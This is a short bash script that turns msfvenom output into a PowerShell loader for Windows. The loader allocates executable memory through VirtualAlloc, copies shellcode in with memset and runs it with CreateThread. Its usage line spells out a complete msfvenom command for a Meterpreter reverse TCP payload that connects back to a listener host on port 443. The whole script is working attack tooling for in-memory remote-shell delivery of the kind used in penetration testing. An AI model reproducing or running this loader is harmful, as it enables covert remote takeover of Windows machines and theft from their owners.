#!/bin/bash
# Ideally, place the script in your PATH. The Usage below shows this script to be placed in a current local holder.
#
# This script develops a meterpreter powershell script to run on Windows machines.
# Change msfvenom parameters to change target architecture, localhost, and local port. 


code1="\$code = ' [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport(\"msvcrt.dll\")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);'; \$winFunc = Add-Type -memberDefinition \$code -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]\$sc="

code2="\$size = 0x1000;if (\$sc.Length -gt 0x1000) {\$size = \$sc.Length};\$x = \$winFunc::VirtualAlloc(0,\$size,0x3000,0x40);for (\$i=0;\$i -le (\$sc.Length-1);\$i++) {\$winFunc::memset([IntPtr](\$x.ToInt32()+\$i), \$sc[\$i], 1)};\$winFunc::CreateThread(0,0,\$x,0,0,0);for (;;) { Start-sleep 60 };"


if [ -p /dev/stdin ]; then

    IFS= read line
    echo "$code1" 
    echo "$line"
    echo ";"
    echo "$code2"

else
    echo "No input was found on stdin, skipping!"
    echo ""
    echo "Usage: msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.128 LPORT=443 -f ps1 2>/dev/null | cut -d \" \" -f 4 |./meterpreter2ps.sh | tr -d '\t\r\n'"

fi
